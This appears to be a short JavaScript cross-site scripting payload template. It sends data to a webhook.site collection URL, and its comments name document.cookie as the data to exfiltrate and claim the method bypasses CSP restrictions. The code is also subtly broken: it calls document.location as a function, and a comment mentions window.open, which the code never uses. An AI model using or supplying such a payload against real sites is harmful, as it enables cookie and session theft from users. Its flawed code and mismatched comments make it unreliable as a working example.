(function() {
    // Replace with your actual webhook.site URL
    const webhookUrl = "https://webhook.site/673c6b56-0dc4-4adb-b539-55c517084bb6";

    // The data you want to exfiltrate (e.g., document.cookie)
    // This example encodes the data to be safely passed in a URL
    const dataToSend = encodeURIComponent("this is a test");

    // Use window.open to send the data
    // Opening a new tab/window might be detected by the user, but it bypasses many CSP restrictions.
    document.location(webhookUrl + "?data=" + dataToSend);
})();
